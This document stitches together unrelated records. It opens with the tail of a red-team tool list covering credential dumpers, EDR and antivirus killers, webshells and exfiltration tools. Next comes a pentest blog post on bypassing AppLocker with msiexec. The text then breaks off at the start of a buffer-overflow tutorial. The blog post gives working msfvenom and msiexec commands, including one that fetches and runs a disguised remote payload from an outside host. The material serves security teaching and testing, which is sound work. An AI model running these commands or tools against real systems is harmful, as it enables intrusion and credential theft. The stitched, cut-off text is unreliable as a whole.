Dumping\n|Name|Description|URL|\n|-----|-----------|----|\n|Mimikatz|Mimikatz is an open-source application that allows users to view and save authentication credentials like Kerberos tickets.|https:\/\/github.com\/gentilkiwi\/mimikatz|\n|Dumpert|LSASS memory dumper using direct system calls and API unhooking.|https:\/\/github.com\/outflanknl\/Dumpert|\n|CredBandit| CredBandit is a proof of concept Beacon Object File (BOF) that uses static x64 syscalls to perform a complete in memory dump of a process and send that back through your already existing Beacon communication channel.|https:\/\/github.com\/xforcered\/CredBandit|\n|CloneVault|CloneVault allows a red team operator to export and import entries including attributes from Windows Credential Manager. |https:\/\/github.com\/mdsecactivebreach\/CloneVault|\n|SharpLAPS|Retrieve LAPS password from LDAP|https:\/\/github.com\/swisskyrepo\/SharpLAPS|\n|SharpDPAPI|SharpDPAPI is a C# port of some DPAPI functionality from @gentilkiwi's Mimikatz project.|https:\/\/github.com\/GhostPack\/SharpDPAPI|\n|KeeThief|Allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system.|https:\/\/github.com\/GhostPack\/KeeThief|\n|SafetyKatz|SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subtee's .NET PE Loader.|https:\/\/github.com\/GhostPack\/SafetyKatz|\n|forkatz|credential dump using forshaw technique using SeTrustedCredmanAccessPrivilege|https:\/\/github.com\/Barbarisch\/forkatz|\n|PPLKiller|Tool to bypass LSA Protection (aka Protected Process Light)|https:\/\/github.com\/RedCursorSecurityConsulting\/PPLKiller|\n|LaZagne|The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer.|https:\/\/github.com\/AlessandroZ\/LaZagne|\n|AndrewSpecial|AndrewSpecial, dumping lsass' memory stealthily and bypassing \"Cilence\" since 2019.|https:\/\/github.com\/hoangprod\/AndrewSpecial|\n|Net-GPPPassword|.NET implementation of Get-GPPPassword. Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.|https:\/\/github.com\/outflanknl\/Net-GPPPassword|\n|SharpChromium|.NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins.|https:\/\/github.com\/djhohnstein\/SharpChromium|\n|Chlonium|Chlonium is an application designed for cloning Chromium Cookies.|https:\/\/github.com\/rxwx\/chlonium|\n|SharpCloud|SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.|https:\/\/github.com\/chrismaddalena\/SharpCloud|\n|pypykatz|Mimikatz implementation in pure Python. At least a part of it :)|https:\/\/github.com\/skelsec\/pypykatz|\n|nanodump|A Beacon Object File that creates a minidump of the LSASS process.|https:\/\/github.com\/helpsystems\/nanodump|\n|Koh|Koh is a C# and Beacon Object File (BOF) toolset that allows for the capture of user credential material via purposeful token\/logon session leakage.|https:\/\/github.com\/GhostPack\/Koh|\n|PPLBlade|Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.|https:\/\/github.com\/tastypepperoni\/PPLBlade|\n\n## Privilege Escalation\n|Name|Description|URL|\n|-----|-----------|----|\n|ElevateKit|The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike's Beacon payload.|https:\/\/github.com\/rsmudge\/ElevateKit|\n|Watson|Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.|https:\/\/github.com\/rasta-mouse\/Watson|\n|SharpUp|SharpUp is a C# port of various PowerUp functionality. Currently, only the most common checks have been ported; no weaponization functions have yet been implemented.|https:\/\/github.com\/GhostPack\/SharpUp|\n|dazzleUP|A tool that detects the privilege escalation vulnerabilities caused by misconfigurations and missing updates in the Windows operating systems. dazzleUP detects the following vulnerabilities.|https:\/\/github.com\/hlldz\/dazzleUP|\n|PEASS|Privilege Escalation Awesome Scripts SUITE (with colors)|https:\/\/github.com\/carlospolop\/PEASS-ng|\n|SweetPotato|A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM|https:\/\/github.com\/CCob\/SweetPotato|\n|MultiPotato| Another Potato to get SYSTEM via SeImpersonate privileges |https:\/\/github.com\/S3cur3Th1sSh1t\/MultiPotato|\n|KrbRelayUp|a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).|https:\/\/github.com\/Dec0ne\/KrbRelayUp|\n|GodPotato|As Long as You Have the ImpersonatePrivilege Permission, Then You are the SYSTEM!|https:\/\/github.com\/BeichenDream\/GodPotato|\n|PrivKit|PrivKit is a simple beacon object file that detects privilege escalation vulnerabilities caused by misconfigurations on Windows OS.|https:\/\/github.com\/mertdas\/PrivKit|\n\n## Defense Evasion\n|Name|Description|URL|\n|-----|-----------|----|\n|RefleXXion|RefleXXion is a utility designed to aid in bypassing user-mode hooks utilised by AV\/EPP\/EDR etc.|https:\/\/github.com\/hlldz\/RefleXXion|\n|EDRSandBlast|EDRSandBlast is a tool written in C that weaponize a vulnerable signed driver to bypass EDR detections (Kernel callbacks and ETW TI provider) and LSASS protections.|https:\/\/github.com\/wavestone-cdt\/EDRSandblast|\n|unDefender|Killing your preferred antimalware by abusing native symbolic links and NT paths.|https:\/\/github.com\/APTortellini\/unDefender|\n|Backstab|A tool to kill antimalware protected processes|https:\/\/github.com\/Yaxser\/Backstab|\n|SPAWN - Cobalt Strike BOF|Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR\/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing.|https:\/\/github.com\/boku7\/spawn|\n|BOF.NET - A .NET Runtime for Cobalt Strike's Beacon Object Files|BOF.NET is a small native BOF object combined with the BOF.NET managed runtime that enables the development of Cobalt Strike BOFs directly in .NET. BOF.NET removes the complexity of native compilation along with the headaches of manually importing native API.|https:\/\/github.com\/CCob\/BOF.NET|\n|NetLoader|Loads any C# binary from filepath or url, patching AMSI and bypassing Windows Defender on runtime|https:\/\/github.com\/Flangvik\/NetLoader|\n|FindObjects-BOF|A Cobalt Strike Beacon Object File (BOF) project which uses direct system calls to enumerate processes for specific modules or process handles.|https:\/\/github.com\/outflanknl\/FindObjects-BOF|\n|SharpUnhooker|C# Based Universal API Unhooker - Automatically Unhook API Hives (ntdll.dll,kernel32.dll,user32.dll,advapi32.dll,and kernelbase.dll).|https:\/\/github.com\/GetRektBoy724\/SharpUnhooker|\n|EvtMute|Apply a filter to the events being reported by windows event logging|https:\/\/github.com\/bats3c\/EvtMute|\n|InlineExecute-Assembly|InlineExecute-Assembly is a proof of concept Beacon Object File (BOF) that allows security professionals to perform in process .NET assembly execution as an alternative to Cobalt Strikes traditional fork and run execute-assembly module|https:\/\/github.com\/xforcered\/InlineExecute-Assembly|\n|Phant0m | Windows Event Log Killer|https:\/\/github.com\/hlldz\/Phant0m|\n|SharpBlock|A method of bypassing EDR's active projection DLL's by preventing entry point execution.|https:\/\/github.com\/CCob\/SharpBlock|\n|NtdllUnpatcher|Example code for EDR bypassing, please use this for testing blue team detection capabilities against this type of malware that will bypass EDR's userland hooks.|https:\/\/github.com\/Kharos102\/NtdllUnpatcher|\n|DarkLoadLibrary|LoadLibrary for offensive operations.|https:\/\/github.com\/bats3c\/DarkLoadLibrary|\n|BlockETW|.Net 3.5 \/ 4.5 Assembly to block ETW telemetry in a process|https:\/\/github.com\/Soledge\/BlockEtw|\n|firewalker|This repo contains a simple library which can be used to add FireWalker hook bypass capabilities to existing code|https:\/\/github.com\/mdsecactivebreach\/firewalker|\n|KillDefenderBOF|Beacon Object File PoC implementation of KillDefender|https:\/\/github.com\/Cerbersec\/KillDefenderBOF|\n|Mangle|Mangle is a tool that manipulates aspects of compiled executables (.exe or DLL) to avoid detection from EDRs|https:\/\/github.com\/optiv\/Mangle|\n|AceLdr|Cobalt Strike UDRL for memory scanner evasion.|https:\/\/github.com\/kyleavery\/AceLdr|\n|AtomLdr|CA DLL loader with advanced evasive features|https:\/\/github.com\/NUL0x4C\/AtomLdr|\n|Inline-Execute-PE|Execute unmanaged Windows executables in CobaltStrike Beacons|https:\/\/github.com\/Octoberfest7\/Inline-Execute-PE|\n|SigFlip|SigFlip is a tool for patching authenticode signed PE files (exe, dll, sys ..etc) without invalidating or breaking the existing signature.|https:\/\/github.com\/med0x2e\/SigFlip|\n|Blackout|kill anti-malware protected processes (BYOVD)|https:\/\/github.com\/ZeroMemoryEx\/Blackout|\n|ShellGhost|A memory-based evasion technique which makes shellcode invisible from process start to end.|https:\/\/github.com\/lem0nSec\/ShellGhost\n\n## Persistence\n|Name|Description|URL|\n|-----|-----------|----|\n|SharpStay|.NET project for installing Persistence|https:\/\/github.com\/0xthirteen\/SharpStay|\n|SharPersist|Windows persistence toolkit written in C#.|https:\/\/github.com\/fireeye\/SharPersist|\n|SharpHide|Tool to create hidden registry keys.|https:\/\/github.com\/outflanknl\/SharpHide|\n|DoUCMe|This leverages the NetUserAdd Win32 API to create a new computer account. This is done by setting the usri1_priv of the USER_INFO_1 type to 0x1000.|https:\/\/github.com\/Ben0xA\/DoUCMe|\n|A Black Path Toward The Sun|(TCP tunneling over HTTP for web application servers)|https:\/\/github.com\/nccgroup\/ABPTTS|\n|pivotnacci|A tool to make socks connections through HTTP agents|https:\/\/github.com\/blackarrowsec\/pivotnacci|\n|reGeorg|The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.|https:\/\/github.com\/sensepost\/reGeorg|\n|DAMP|The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.|https:\/\/github.com\/HarmJ0y\/DAMP|\n|IIS-Raid|A native backdoor module for Microsoft IIS (Internet Information Services)|https:\/\/github.com\/0x09AL\/IIS-Raid|\n|SharPyShell|tiny and obfuscated ASP.NET webshell for C# web applications|https:\/\/github.com\/antonioCoco\/SharPyShell|\n|ScheduleRunner|A C# tool with more flexibility to customize scheduled task for both persistence and lateral movement in red team operation|https:\/\/github.com\/netero1010\/ScheduleRunner|\n|SharpEventPersist|Persistence by writing\/reading shellcode from Event Log|https:\/\/github.com\/improsec\/SharpEventPersist|\n|Kraken|Kraken, a modular multi-language webshell coded by @secu_x11.|https:\/\/github.com\/kraken-ng\/Kraken|\n|HiddenDesktop|HVNC for Cobalt Strike|https:\/\/github.com\/WKL-Sec\/HiddenDesktop|\n\n## Lateral Movement\n|Name|Description|URL|\n|-----|-----------|----|\n|Liquid Snake|LiquidSnake is a tool that allows operators to perform fileless lateral movement using WMI Event Subscriptions and GadgetToJScript|https:\/\/github.com\/RiccardoAncarani\/LiquidSnake|\n|PowerUpSQL|A PowerShell Toolkit for Attacking SQL Server|https:\/\/github.com\/NetSPI\/PowerUpSQL|\n|SQLRecon|A C# MS SQL toolkit designed for offensive reconnaissance and post-exploitation.|https:\/\/github.com\/skahwah\/SQLRecon|\n|SCShell|Fileless lateral movement tool that relies on ChangeServiceConfigA to run command|https:\/\/github.com\/Mr-Un1k0d3r\/SCShell|\n|SharpRDP|Remote Desktop Protocol Console Application for Authenticated Command Execution|https:\/\/github.com\/0xthirteen\/SharpRDP|\n|MoveKit|Movekit is an extension of built in Cobalt Strike lateral movement by leveraging the execute_assembly function with the SharpMove and SharpRDP .NET assemblies.|https:\/\/github.com\/0xthirteen\/MoveKit|\n|SharpNoPSExec|File less command execution for lateral movement.|https:\/\/github.com\/juliourena\/SharpNoPSExec|\n|Responder\/MultiRelay|LLMNR\/NBT-NS\/mDNS Poisoner and NTLMv1\/2 Relay.|https:\/\/github.com\/lgandx\/Responder|\n|impacket|Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.|https:\/\/github.com\/SecureAuthCorp\/impacket|\n|Farmer|Farmer is a project for collecting NetNTLM hashes in a Windows domain. |https:\/\/github.com\/mdsecactivebreach\/Farmer|\n|CIMplant|C# port of WMImplant which uses either CIM or WMI to query remote systems. It can use provided credentials or the current user's session.|https:\/\/github.com\/FortyNorthSecurity\/CIMplant|\n|PowerLessShell|PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. You can also execute raw shellcode using the same approach.|https:\/\/github.com\/Mr-Un1k0d3r\/PowerLessShell|\n|SharpGPOAbuse|SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.|https:\/\/github.com\/FSecureLABS\/SharpGPOAbuse|\n|kerbrute|A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication|https:\/\/github.com\/ropnop\/kerbrute|\n|mssqlproxy|mssqlproxy is a toolkit aimed to perform lateral movement in restricted environments through a compromised Microsoft SQL Server via socket reuse|https:\/\/github.com\/blackarrowsec\/mssqlproxy|\n|Invoke-TheHash|PowerShell Pass The Hash Utils|https:\/\/github.com\/Kevin-Robertson\/Invoke-TheHash|\n|InveighZero|.NET IPv4\/IPv6 machine-in-the-middle tool for penetration testers|https:\/\/github.com\/Kevin-Robertson\/InveighZero|\n|SharpSpray|SharpSpray a simple code set to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobalt Strike.|https:\/\/github.com\/jnqpblc\/SharpSpray|\n|CrackMapExec|A swiss army knife for pentesting networks|https:\/\/github.com\/byt3bl33d3r\/CrackMapExec|\n|SharpAllowedToAct|A C# implementation of a computer object takeover through Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity) based on the research by @elad_shamir.|https:\/\/github.com\/pkb1s\/SharpAllowedToAct|\n|SharpRDPHijack|Sharp RDP Hijack is a proof-of-concept .NET\/C# Remote Desktop Protocol (RDP) session hijack utility for disconnected sessions|https:\/\/github.com\/bohops\/SharpRDPHijack|\n|CheeseTools|This repository has been made basing onto the already existing MiscTool, so big shout-out to rasta-mouse for releasing them and for giving me the right motivation to work on them.|https:\/\/github.com\/klezVirus\/CheeseTools|\n|LatLoader|PoC module to demonstrate automated lateral movement with the Havoc C2 framework.|https:\/\/github.com\/icyguider\/LatLoader|\n|SharpSpray|SharpSpray is a Windows domain password spraying tool written in .NET C#.|https:\/\/github.com\/iomoath\/SharpSpray|\n|MalSCCM|This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage.|https:\/\/github.com\/nettitude\/MalSCCM\n|Coercer|A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 9 methods.|https:\/\/github.com\/p0dalirius\/Coercer|\n|SharpSploit|SharpSploit is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers.|https:\/\/github.com\/cobbr\/SharpSploit|\n|orpheus|Bypassing Kerberoast Detections with Modified KDC Options and Encryption Types|https:\/\/github.com\/trustedsec\/orpheus|\n\n### Tunneling\n|Name|Description|URL|\n|-----|-----------|----|\n|Chisel|Chisel is a fast TCP\/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server.|https:\/\/github.com\/jpillora\/chisel|\n|frp|frp is a fast reverse proxy that allows you to expose a local server located behind a NAT or firewall to the Internet.|https:\/\/github.com\/fatedier\/frp|\n|ligolo-ng|An advanced, yet simple, tunneling tool that uses a TUN interface.|https:\/\/github.com\/nicocha30\/ligolo-ng|\n\n## Exfiltration\n|Name|Description|URL|\n|-----|-----------|----|\n|SharpExfiltrate|Modular C# framework to exfiltrate loot over secure and trusted channels.|https:\/\/github.com\/Flangvik\/SharpExfiltrate|\n|DNSExfiltrator|Data exfiltration over DNS request covert channel|https:\/\/github.com\/Arno0x\/DNSExfiltrator|\n|Egress-Assess|Egress-Assess is a tool used to test egress data detection capabilities.|https:\/\/github.com\/FortyNorthSecurity\/Egress-Assess|\n\n## Miscellaneous\n### Threat-informed Defense\n|Name|Description|URL|\n|-----|-----------|----|\n|Tidal Cyber|Tidal Cyber helps enterprise organizations to define, measure, and improve their defenses to address the adversary behaviors that are most important to them.|https:\/\/app.tidalcyber.com|\n|Control Validation Compass|Threat modeling aide & purple team content repository, pointing security & intelligence teams to 10,000+ publicly-accessible technical and policy controls and 2,100+ offensive security tests, aligned with nearly 600 common attacker techniques|https:\/\/controlcompass.github.io|\n\n### Cloud\n#### Amazon Web Services  (AWS)\n|Name|Description|URL|\n|-----|-----------|----|\n|pacu|The AWS exploitation framework, designed for testing the security of Amazon Web Services environments.|https:\/\/github.com\/RhinoSecurityLabs\/pacu|\n|CloudMapper|CloudMapper helps you analyze your Amazon Web Services (AWS) environments.|https:\/\/github.com\/duo-labs\/cloudmapper|\n|Enumerate IAM permissions|Enumerate the permissions associated with AWS credential set|https:\/\/github.com\/andresriancho\/enumerate-iam|\n\n#### Azure\n|Name|Description|URL|\n|-----|-----------|----|\n|Azure AD Connect password extraction|This toolkit offers several ways to extract and decrypt stored Azure AD and Active Directory credentials from Azure AD Connect servers.|https:\/\/github.com\/fox-it\/adconnectdump|\n|Storm Spotter|Azure Red Team tool for graphing Azure and Azure Active Directory objects|https:\/\/github.com\/Azure\/Stormspotter|\n|ROADtools|The Azure AD exploration framework.|https:\/\/github.com\/dirkjanm\/ROADtools|\n|MicroBurst: A PowerShell Toolkit for Attacking Azure|A collection of scripts for assessing Microsoft Azure security|https:\/\/github.com\/NetSPI\/MicroBurst|\n|AADInternals|AADInternals PowerShell module for administering Azure AD and Office 365|https:\/\/github.com\/Gerenios\/AADInternals|\n|TeamFiltration|TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts.|https:\/\/github.com\/Flangvik\/TeamFiltration|\n|MAAD Attack Framework|An attack tool for simple, fast & effective security testing of M365 & Azure AD.|https:\/\/github.com\/vectra-ai-research\/MAAD-AF|\n\n### Adversary Emulation\n|Name|Description|URL|\n|-----|-----------|----|\n|Stratus Red Team|Stratus Red Team is \"Atomic Red Team\u2122\" for the cloud, allowing to emulate offensive attack techniques in a granular and self-contained manner.|https:\/\/github.com\/DataDog\/stratus-red-team|\n|Prelude Operator|A Platform for Developer-first advanced security\u00b7 Defend your organization by mimicking real adversarial attacks.|https:\/\/www.preludesecurity.com\/products\/operator|\n|Prelude Build|An open source IDE for authoring, testing, and verifying production-ready security tests..|https:\/\/www.preludesecurity.com\/products\/build|\n|Caldera|An automated adversary emulation system that performs post-compromise adversarial behavior within Windows Enterprise networks.|https:\/\/github.com\/mitre\/caldera|\n|APTSimulator|A Windows Batch script that uses a set of tools and output files to make a system look as if it was compromised.|https:\/\/github.com\/NextronSystems\/APTSimulator|\n|Atomic Red Team|Small and highly portable detection tests mapped to the Mitre ATT&CK Framework.|https:\/\/github.com\/redcanaryco\/atomic-red-team|\n|Network Flight Simulator|flightsim is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility.|https:\/\/github.com\/alphasoc\/flightsim|\n|Metta|A security preparedness tool to do adversarial simulation.|https:\/\/github.com\/uber-common\/metta|\n|Red Team Automation (RTA)| RTA provides a framework of scripts designed to allow blue teams to test their detection capabilities against malicious tradecraft, modeled after MITRE ATT&CK.|https:\/\/github.com\/endgameinc\/RTA|\n|TTPForge|The TTPForge is a Framework created to facilitate the development, automation, and execution of Tactics, Techniques, and Procedures (TTPs).|https:\/\/github.com\/facebookincubator\/TTPForge|\n\n### Living Off the Living Off the Land\n|Name|Description|URL|\n|-----|-----------|----|\n|Living Off The Land Drivers|Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks|https:\/\/www.loldrivers.io\/|\n|GTFOBins|GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems|https:\/\/gtfobins.github.io|\n|LOLBAS|The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques|https:\/\/lolbas-project.github.io\/|\n|Living Off Trusted Sites (LOTS) Project|Attackers are using popular legitimate domains when conducting phishing, C&C, exfiltration and downloading tools to evade detection. The list of websites below allow attackers to use their domain or subdomain|https:\/\/lots-project.com|\n|Filesec|Stay up-to-date with the latest file extensions being used by attackers.|https:\/\/filesec.io\/|\n|LOOBins|Living Off the Orchard: macOS Binaries (LOOBins) is designed to provide detailed information on various built-in macOS binaries and how they can be used by threat actors for malicious purposes.|https:\/\/www.loobins.io\/|\n|WTFBins|WTFBin(n): a binary that behaves exactly like malware, except, somehow, it's not? This project aims to catalogue benign applications that exhibit suspicious behavior. These binaries can emit noise and false positives in threat hunting and automated detections.|https:\/\/wtfbins.wtf\/|\n|Hijack Libs|This project provides an curated list of DLL Hijacking candidates|https:\/\/hijacklibs.net|\n\n### Red Team Scripts\n|Name|Description|URL|\n|-----|-----------|----|\n|RedTeamCCode|Red Team C code repo|https:\/\/github.com\/Mr-Un1k0d3r\/RedTeamCCode|\n|EDRs|This repo contains information about EDRs that can be useful during red team exercise.|https:\/\/github.com\/Mr-Un1k0d3r\/EDRs|\n|Cobalt Strike Community Kit|Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike.|https:\/\/cobalt-strike.github.io\/community_kit\/|\n\n### Red Team Infrastructure\n|Name|Description|URL|\n|-----|-----------|----|\n|Red Team Infrastructure Wiki|Wiki to collect Red Team infrastructure hardening resources|https:\/\/github.com\/bluscreenofjeff\/Red-Team-Infrastructure-Wiki|\n\n### DevOps\n|Name|Description|URL|\n|-----|-----------|----|\n|Nemesis|Nemesis is an offensive data enrichment pipeline and operator support system.|https:\/\/github.com\/SpecterOps\/Nemesis|\n\n### Reporting & Tracking\n|Name|Description|URL|\n|-----|-----------|----|\n|Ghostwriter|Ghostwriter is a Django-based web application designed to be used by an individual or a team of red team operators.|https:\/\/github.com\/GhostManager\/Ghostwriter|\n|VECTR|VECTR is a tool that facilitates tracking of your red and blue team testing activities to measure detection and prevention capabilities across different attack scenarios|https:\/\/github.com\/SecurityRiskAdvisors\/VECTR|\n|PurpleOps|An open-source self-hosted purple team management web application.|https:\/\/github.com\/CyberCX-STA\/PurpleOps|\n\n## License\n[![CC0](http:\/\/mirrors.creativecommons.org\/presskit\/buttons\/88x31\/svg\/cc-zero.svg)](http:\/\/creativecommons.org\/publicdomain\/zero\/1.0)\n\nTo the extent possible under law, Rahmat Nurfauzi &#34;@infosecn1nja&#34; has waived all copyright and related or neighboring rights to this work.\n"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb AppLocker Bypass \u2013 MSIEXEC\nComments Feed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]June 16, 2017\nAppLocker Bypass \u2013 MSIEXEC\nby [28]Administrator.In [29]Defense Evasion.[30]1 Comment on AppLocker\nBypass \u2013 MSIEXEC\nMSIEXEC is a Microsoft utility that can be used to install or configure\na product from the command line. If an environment is not configured\nproperly the use of .MSI files can allow an attacker either to perform\n[31]privilege escalation or to bypass AppLocker rules. The following\npost demonstrates that systems that are configured not to block\nexecution of MSI files for all users are not properly protected as any\nAppLocker executable rule can be bypassed easily.\nMetasploit MsfVenom can be used in order to generate .MSI files that\nwill execute a command or a payload.\nmsfvenom -f msi -p windows\/exec CMD=powershell.exe > powershell.msi\nNo platform was selected, choosing Msf::Module::Platform::Windows from the paylo\nad\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 199 bytes\nFinal size of msi file: 159744 bytes\nMsfVenom - Generating MSI Files MsfVenom \u2013 Generating MSI Files\nExecution of powershell.msi will open a PowerShell session bypassing\nthe AppLocker rule that deny the use of PowerShell for all users.\nMSIEXEC - PowerShell MSIEXEC \u2013 PowerShell\nIt is also possible to run the command below either from a command\nprompt or if it is blocked through Windows Run.\nmsiexec \/quiet \/i cmd.msi\nMSIEXEC via Run MSIEXEC via Run\nThe command prompt will open.\nmsiexec - Command Prompt MSIEXEC \u2013 Command Prompt\nAlternatively msiexec utility has the ability to run MSI files that\nhave been renamed to PNG. These files can be executed either locally or\nremotely from a command prompt or from Windows Run bypassing AppLocker\nrules.\nmsiexec \/q \/i http:\/\/192.168.100.3\/tmp\/cmd.png\nmsiexec - Command Prompt via PNG MSIEXEC \u2013 Command Prompt via PNG\nThe same concept applies and for MSI files that contain Meterpreter\npayloads.\nMSI - Meterpreter Payload MSI \u2013 Meterpreter PayloadMSIEXEC -\nMeterpreter MSIEXEC \u2013 Meterpreter\nRate this:\nShare this:\n* [32]Twitter\n* [33]Facebook\n* [34]LinkedIn\n* [35]Reddit\n* [36]Tumblr\n* [37]WhatsApp\n* [38]Telegram\n* [39]Pinterest\n* [40]Pocket\n* [41]Email\n*\nLike Loading...\nRelated\n[42]AppLocker[43]Metasploit[44]Meterpreter[45]MSI[46]MSIEXEC\n1 Comment\n1. Pingback: [47]Ethereal @ hackthebox: Certificate-Related Rabbit\nHoles | elkemental Force\nLeave a Reply [48]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[49]Previous Previous post: Intel SYSRET\n[50]Next Next post: Injecting Metasploit Payloads into Android\nApplications \u2013 Manually\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [51]Persistence \u2013 Event Log\n* [52]Initial Access \u2013 search-ms URI Handler\n* [53]Persistence \u2013 Scheduled Task Tampering\n* [54]Persistence \u2013 Windows Telemetry\n* [55]Persistence \u2013 Service Control Manager\nCategories\n* [56]Coding (10)\n* [57]Exploitation Techniques (19)\n* [58]External Submissions (3)\n* [59]General Lab Notes (22)\n* [60]Information Gathering (12)\n* [61]Infrastructure (2)\n* [62]Maintaining Access (4)\n* [63]Mobile Pentesting (7)\n* [64]Network Mapping (1)\n* [65]Post Exploitation (13)\n* [66]Red Team (123)\n+ [67]Credential Access (3)\n+ [68]Defense Evasion (22)\n+ [69]Domain Escalation (5)\n+ [70]Domain Persistence (4)\n+ [71]Initial Access (1)\n+ [72]Lateral Movement (2)\n+ [73]Man-in-the-middle (1)\n+ [74]Persistence (34)\n+ [75]Privilege Escalation (17)\n* [76]Reviews (1)\n* [77]Social Engineering (11)\n* [78]Tools (7)\n* [79]VoIP (4)\n* [80]Web Application (14)\n* [81]Wireless (2)\nPentest Laboratories Discord\n* [82]Discord\nPen Test Lab Stats\n* 7,183,938 hits\n[83]Facebook Page\n[84]Facebook Page\n__________________________________________________________________\n[85]Blog at WordPress.com.\n* [86]Methodologies\n+ [87]Red Teaming\no [88]Persistence\n* [89]Resources\n+ [90]Papers\no [91]Web Application\n+ [92]Presentations\no [93]Defcon\no [94]DerbyCon\no [95]Tools\n+ [96]Videos\no [97]BSides\no [98]Defcon\no [99]DerbyCon\no [100]Hack In Paris\n* [101]Contact\n+ [102]About Us\n* [103]Comment\n* [104]Reblog\n* [105]Subscribe [106]Subscribed\n+ [107]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [108]Log in now.\n*\n+ [109]Penetration Testing Lab\n+ [110]Customize\n+ [111]Subscribe [112]Subscribed\n+ [113]Sign up\n+ [114]Log in\n+ [115]Copy shortlink\n+ [116]Report this content\n+ [117]View post in Reader\n+ [118]Manage subscriptions\n+ [119]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [120]likes-master\n%d"}
{"text":"#[1]desc0n0cid0 - Atom [2]desc0n0cid0 - RSS [3]desc0n0cid0 - Atom\n[4][des.jpg]\n[5]desc0n0cid0\nPython, cybersecurity, programming.\nMenu\n[6]Skip to content\n* [7]Home\n* [8]Business\n+ [9]Internet\n+ [10]Market\n+ [11]Stock\n* [12]Downloads\n+ [13]Dvd\n+ [14]Games\n+ [15]Software\no [16]Office\n* [17]Parent Category\n+ [18]Child Category 1\no [19]Sub Child Category 1\no [20]Sub Child Category 2\no [21]Sub Child Category 3\n+ [22]Child Category 2\n+ [23]Child Category 3\n+ [24]Child Category 4\n* [25]Featured\n* [26]Health\n+ [27]Childcare\n+ [28]Doctors\n* [29]Uncategorized\n[30]Sidebar\nSearch for: ____________________ Submit\nMe\n* [31]LinkedIn\n* [32]twitter\n* [33]Github\n* [34]rozwal.to\nBlog Archive\n* [35]\u25ba  [36]2019 (1)\n+ [37]\u25ba  [38]January (1)\n* [39]\u25ba  [40]2017 (6)\n+ [41]\u25ba  [42]June (2)\n+ [43]\u25ba  [44]May (1)\n+ [45]\u25ba  [46]April (1)\n+ [47]\u25ba  [48]March (1)\n+ [49]\u25ba  [50]January (1)\n* [51]\u25bc  [52]2016 (7)\n+ [53]\u25ba  [54]November (2)\n+ [55]\u25bc  [56]October (1)\no [57]Part 4 | Stack-based Buffer Overflow exploitation ...\n+ [58]\u25ba  [59]September (4)\nSunday 23 October 2016\n[60]Part 4 | Stack-based Buffer Overflow exploitation to shell by example\nStandard\n* Share This:\n* [61] Facebook\n* [62] Twitter\n* [63] Google+\n* [64] Stumble\n* [65] Digg\nThis is the next part of guide about exploiting buffer overflows, this\ntime we will cover return-to-libc but for x64 architecture as well as\njust a little bit of Return Oriented Programming, generally what is the\nidea behind it, going into details in the next parts.\n8. x86_64 